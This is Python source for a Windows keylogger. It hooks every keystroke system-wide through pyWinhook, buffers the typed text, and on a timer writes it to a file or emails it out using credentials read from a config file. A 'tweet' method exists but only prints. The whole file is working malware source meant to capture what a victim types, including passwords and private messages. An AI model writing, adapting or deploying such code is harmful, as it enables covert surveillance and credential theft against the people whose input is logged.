import time
from threading import Thread

import pythoncom
import pyWinhook as pyHook
from utils import send_mail
import configparser 
import os


class KeyLogger:

    def __init__(self,log_method=1,log_file='keylog.txt',debug=False,time_interval=1):
        self.key_strokes = ""
        self.log_file = None
        self.timer = Thread(target=self.schedule_log,args=())
        self.timer.daemon = True
        self.time_interval = time_interval * 60
        if log_method == 1:
            self.log_method = self.log_to_file
            self.log_file = open(log_file,'w')
        elif log_method == 2:
            self.log_method = self.tweet_log
        elif log_method == 3:
            self.log_method = self.email_log

    def schedule_log(self):
        while True:
            time.sleep(self.time_interval)
            self.log_method()

    def ListenKeyboard(self,event):
        if event.Key == 'Escape':
            print("Writing logs and quitting...")
            self.log_method()
            exit(0)
        if event.Ascii in range(32,127):
            if event.MessageName == 'key down':
                self.key_strokes += chr(event.Ascii)
        else:
            if event.MessageName == 'key down':
                self.key_strokes += f' [{event.Key}] '

        return True

    def run(self):
 
        hm = pyHook.HookManager()
        hm.KeyAll = self.ListenKeyboard
        hm.HookKeyboard()

        self.timer.start()

        print("Keylogger started.") # logging
        pythoncom.PumpMessages()

    def log_to_file(self):
        self.log_file.write(self.key_strokes)
        self.log_file.flush()
        self.key_strokes = ""

    def tweet_log(self):
        print("Tweeting keylogs: ",self.key_strokes)
        self.key_strokes = ""

    def email_log(self,login_cred=None):
        email = None
        password = None
        print("Sending email logs...")
        if login_cred is None:
            if os.path.exists('email.cfg'):
                config = configparser.ConfigParser()
                config.read('email.cfg')
                email = config['LOGIN_CRED']['EMAIL']
                password = config['LOGIN_CRED']['PASSWORD']
        else:
            email, password = login_cred
        send_mail(email,email,time.strftime('Keylogs for %c'),self.key_strokes,creds=(email,password))
        self.key_strokes = ""

if __name__ == "__main__":
    keylogger = KeyLogger(log_method=1)
    keylogger.run()